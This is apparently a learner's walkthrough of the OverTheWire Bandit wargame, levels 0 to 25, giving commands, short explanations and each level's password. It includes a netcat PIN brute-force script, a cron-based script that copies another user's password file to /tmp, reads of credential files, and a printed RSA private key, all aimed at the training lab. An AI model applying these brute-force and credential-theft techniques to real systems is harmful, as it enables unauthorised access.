@@ -1,0 +1,468 @@
+OVERTHEWIRE WARGAMES - BANDIT
+
+
+
+Level 0
+ssh bandit0@bandit.labs.overthewire.org -p 2220
+Password: bandit0
+
+
+
+Level 0 - Level 1
+Ls
+Nano readme
+The password you are looking for is: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
+
+
+
+Level 1 - Level 2
+ssh bandit1@bandit.labs.overthewire.org -p 2220
+Password: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
+Ls
+Nano ./-
+Flag: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx
+
+
+
+Level 2 - Level 3
+ssh bandit2@bandit.labs.overthewire.org -p 2220
+Password: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx
+Ls
+Cat “space in filename”
+Flag: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
+
+
+
+Level 3 - Level 4
+ssh bandit3@bandit.labs.overthewire.org -p 2220
+Password: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
+Ls
+Cd inhere
+Ls -a
+Cat …Hiding-From-You
+Flag: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
+
+
+
+Level 4 - Level 5
+ssh bandit4@bandit.labs.overthewire.org -p 2220
+Password: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
+Ls
+Cd inhere
+Ls
+Cat ./-file00
+Cat ./-file01
+Cat ./-file02
+Cat ./-file03
+Cat ./-file04
+Cat ./-file05
+Cat ./-file06
+Cat ./-file07
+Flag: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
+
+
+
+Level 5 - Level 6
+ssh bandit5@bandit.labs.overthewire.org -p 2220
+Password: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
+Ls
+Cd inhere
+Find . -type f -size 1033c
+Flag: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
+
+
+
+Level 6 - Level 7
+ssh bandit6@bandit.labs.overthewire.org -p 2220
+Password: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
+find / -type f -size 33c -user bandit7 -group bandit6
+cat /var/lib/dpkg/info/bandit7.password
+Flag: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
+
+
+
+Level 7 - Level 8
+ssh bandit7@bandit.labs.overthewire.org -p 2220
+Password: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
+ls 
+Cat data.txt
+grep -i -e "millionth" data.txt
+Flag: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
+
+
+
+Level 8 - Level 9
+ssh bandit8@bandit.labs.overthewire.org -p 2220
+Password: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
+Ls
+sort data.txt | uniq -u
+sort data.txt: Sorts the lines of the file (required by uniq to detect duplicates).
+uniq -u: Filters only unique lines — i.e., lines that occur only once in the sorted input.
+Flag: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
+
+
+
+Level 9 - Level 10
+ssh bandit9@bandit.labs.overthewire.org -p 2220
+Password: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
+Ls
+strings data.txt | grep -E '={2,}.*'
+strings data.txt: extracts only human-readable strings from data.txt.
+-E for extended regex:
+={2,}: means 2 or more = characters.
+Flag: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
+
+
+
+Level 10 to Level 11
+ssh bandit10@bandit.labs.overthewire.org -p 2220
+Password: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
+Ls
+cat data.txt | base64 -d
+Base64 -d decodes the output
+Flag: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
+
+
+
+Level 11 to Level 12
+ssh bandit11@bandit.labs.overthewire.org -p 2220
+Password: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
+Ls
+tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt
+This tells tr to shift:
+A-Z → N-ZA-M (uppercase)
+a-z → n-za-m (lowercase
+Flag: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
+
+
+
+Level 12 to Level 13
+ssh bandit12@bandit.labs.overthewire.org -p 2220
+Password: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
+The first attempt, I manually entered commands to decompress each file layer. After completing all 9 layers, I realized that method was highly inefficient, so I decided to create a script to automate the process. See script below
+
+#!/bin/bash
+
+# Function to check the file type and decompress if necessary
+check_and_decompress() {
+    local file=$1
+    local count=1
+
+    while true; do
+        # Check the file type using the 'file' command
+        file_type=$(file -b "$file")
+        echo "File type: $file_type"
+
+        # If the file is ASCII text, we can stop and cat the file
+        if [[ "$file_type" == *ASCII* ]]; then
+            echo "File is in ASCII format. Displaying content:"
+            cat "$file"
+            break
+        fi
+
+        # Handle different compression types
+        if [[ "$file_type" == *gzip* ]]; then
+            echo "File is gzip compressed. Decompressing..."
+            # Use -c to write to stdout and redirect to a new file with number appended
+            gunzip -c "$file" > "${file}_$count"
+            file="${file}_$count"  # Update the file name after decompression
+        elif [[ "$file_type" == *bzip2* ]]; then
+            echo "File is bzip2 compressed. Decompressing..."
+            bunzip2 -c "$file" > "${file}_$count"
+            file="${file}_$count"  # Update the file name after decompression
+        elif [[ "$file_type" == *XZ* ]]; then
+            echo "File is xz compressed. Decompressing..."
+            unxz -c "$file" > "${file}_$count"
+            file="${file}_$count"  # Update the file name after decompression
+        elif [[ "$file_type" == *zip* ]]; then
+            echo "File is zip compressed. Decompressing..."
+            unzip -p "$file" > "${file}_$count"  # Use -p for unzip to write to stdout
+            file="${file}_$count"  # Update the file name after decompression
+        elif [[ "$file_type" == *tar* ]]; then
+            echo "File is tar compressed. Extracting..."
+            tar -xOf "$file" > "${file}_$count"
+            file="${file}_$count"  # Update the file name after decompression
+        else
+            echo "Unknown compression format or unrecognized file type. Exiting."
+            exit 1
+        fi
+
+        # Increment count for the next decompressed file name
+        ((count++))
+
+        # Pause before checking again
+        sleep 1
+    done
+}
+
+# Check that the file exists
+if [[ ! -f "$1" ]]; then
+    echo "File $1 does not exist. Exiting."
+    exit 1
+fi
+
+# Call the function with the provided file
+check_and_decompress "$1"
+
+Flag: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
+
+
+
+Level 13 to Level 14
+ssh bandit13@bandit.labs.overthewire.org -p 2220
+Password: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
+Ls
+ssh -i sshkey.private bandit14@bandit -p 2220
+The -i option in the ssh command is used to specify the path to a private key file for authentication when logging into a remote server.
+cat /etc/bandit_pass/bandit14
+Flag: MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
+
+
+
+Level 14 to Level 15
+ssh bandit14@bandit.labs.overthewire.org -p 2220
+Password: MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
+ssh bandit14@bandit -p 30000
+Connection closed by 127.0.0.1 port 30000
+nmap 127.0.0.1
+Checking to see more info
+telnet 127.0.0.1 30000
+Trying an alternative service to connect
+Flag: 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+
+
+
+Level 15 to Level 16
+ssh bandit15@bandit.labs.overthewire.org -p 2220
+Password: 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+openssl s_client -connect 127.0.0.1:30001
+Flag: kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+
+
+
+Level 16 to Level 17
+ssh bandit16@bandit.labs.overthewire.org -p 2220
+Password: kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+nmap -p 31000-32000 localhost
+openssl s_client -connect localhost:31960
+Wrong one
+openssl s_client -connect localhost:31790
+Appears to be right, but not working
+openssl s_client -connect localhost:31790 -quiet
+Quiet is used to bypass interactivity.
+After entering the password, it returned an RSA private key. 
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+After logging out, I used the above key to create a private key locally - sshkey.private
+Nano sshkey.private
+The above key is used to log into the next level. 
+	
+
+
+Level 17 to Level 18
+Ssh -i sshkey.private bandit17@bandit.labs.overthewire.org -p 2220
+This didnt work because I did not restrict permission on the key. 
+chmod 600 sshkey.private
+Ssh -i sshkey.private bandit18@bandit.labs.overthewire.org -p 2220
+This worked but I was immediately logged out do to a modified .bashrc file
+Ls
+diff passwords.old passwords.new
+Flag: x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
+
+
+
+Level 18 to Level 19
+ssh -t bandit18@bandit.labs.overthewire.org -p 2220 "bash --noprofile -norc"
+The -t option is used to force pseudo-terminal allocation.
+This option is necessary when you want to run interactive commands on the remote machine. Without -t, you might not be able to run commands that require a terminal (like bash).
+It's especially useful if you're running commands that would normally open an interactive session (e.g., starting a shell), and you need it to behave like a terminal session.
+bash: This starts the Bash shell, the default shell on many Linux systems.
+--noprofile: This tells bash not to read the system-wide and user-specific login scripts, such as /etc/profile or ~/.bash_profile. Normally, these files are sourced when you start a login shell, but this option skips that.
+--norc: This tells bash not to read the user-specific initialization file ~/.bashrc. Normally, .bashrc is sourced when starting an interactive non-login shell, but this option prevents it from being read.
+Password: x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
+Ls
+Cat readme
+Flag: cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+
+
+
+Level 19 to Level 20
+ssh bandit19@bandit.labs.overthewire.org -p 2220
+Password: cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+Ls
+./bandit20-do
+./bandit20-do cat /etc/bandit_pass/bandit20
+Flag: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+
+
+
+Level 20 to Level 21
+Open terminal 1 and login
+ssh bandit20@bandit.labs.overthewire.org -p 2220
+Password: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+nc -l -p 1234
+Creates a netcat listener on port 1234 locally
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+Sending the password that suconnect will be looking for over port 1234
+Open terminal 2 and login
+Ls
+./suconnect
+./suconnect 1234
+See flag in terminal 1
+Flag: EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+
+
+
+Level 21 to Level 22
+ssh bandit21@bandit.labs.overthewire.org -p 2220
+Password: EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+Cd /etc/cron.d
+Ls
+cat cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh 
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Flag: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+
+
+
+Level 22 to Level 23
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+Password: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+cd /etc/cron.d/
+Ls
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum
+To obtain the directory path, I run the same process inside the script on the string, I am user $myname, using bandit23 for $myname. 
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+Flag: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+
+
+Level 23 to Level 24
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+Cd /etc/cron.d
+Ls
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+This script will execute other scripts in the /var/spool/$myname/foo directory
+cd /tmp
+To make a script I need to use the /tmp directory. 
+vim task.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/ans
+Save (:wq)
+chmod 777 task.sh
+Changes permissions so there are no holdups executing
+cp task.sh /var/spool/bandit24/foo/
+This is the directory the cron job script will execute other scripts from
+cat /tmp/ans
+This is where I told the script to dump the password from /etc/bandit_pass/bandit24
+Flag: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+
+
+Level 24 to Level 25
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+Nc localhost 30002
+This works, but i need to make a script to check all 10000 combinations of the 4-digit code.
+Cd /tmp/
+Nano ncbrute.sh
+
+#!/bin/bash
+
+# Define the password and target connection details
+PASSWORD="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+PORT="30002"
+HOST="localhost"
+
+# Loop through all 4-digit PIN combinations (from 0000 to 9999)
+for PIN in $(seq -f "%04g" 0 9999); do
+    # Construct the full message by appending the password and PIN
+    MESSAGE="$PASSWORD $PIN"
+    
+    # Use netcat (nc) to send the message to the server and capture the response
+    RESPONSE=$(echo "$MESSAGE" | nc -w 2 $HOST $PORT)
+    
+    # If the response doesn't contain "Wrong!", consider it a success
+    if ! echo "$RESPONSE" | grep -q "Wrong!"; then
+        echo "Success! The correct PIN is: $PIN"
+        break
+    else
+        echo "Incorrect PIN: $PIN"
+    fi
+    
+    # Optional: Sleep briefly between requests to avoid overwhelming the server
+    sleep 0.1
+done
+
+Bash ncbrute.sh
+ -f "%04g" (Format Option)
+The -f option in seq is used to format the output.
+"%04g" is a format string that tells seq to print the numbers in a 4-digit format. Here's what each part means:
+%: Denotes the start of the format string
+0: Tells seq to pad the numbers with leading zeros (if necessary).
+4: Specifies the minimum width of the number. So, the numbers will always have 4 digits.
+g: A format specifier for general format (which is suitable for integers in this case).
+This version works but takes FOREVER. So I decided to see if there was an alternative. I tried to adjust the code so nc was only run once and the session stayed open but I couldn’t get it to work so I took a completely different approach. I decided to create a password list using a simple script.
+Nano pwgen.sh
+
+#!/bin/bash
+
+# Define the base password
+PASSWORD="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+
+# Output file
+OUTPUT_FILE="ncpasswords.txt"
+
+# Loop through all 4-digit PIN combinations (from 0000 to 9999)
+for PIN in $(seq -f "%04g" 0 9999); do
+    # Append the password and PIN, and save it to the file
+    echo "$PASSWORD $PIN" >> $OUTPUT_FILE
+done
+
+echo "Generated passwords saved to $OUTPUT_FILE"
+
+Bash pwgen.sh
+Cat ncpasswords.txt
+To make sure it worked
+cat ncpasswords.txt | nc localhost 30002 > results.txt
+This pipes each password to netcat and then saves the output in a text file.
+Cat results.txt
+Flag: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+
+
+Level 25 to Level 26
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+In progress……
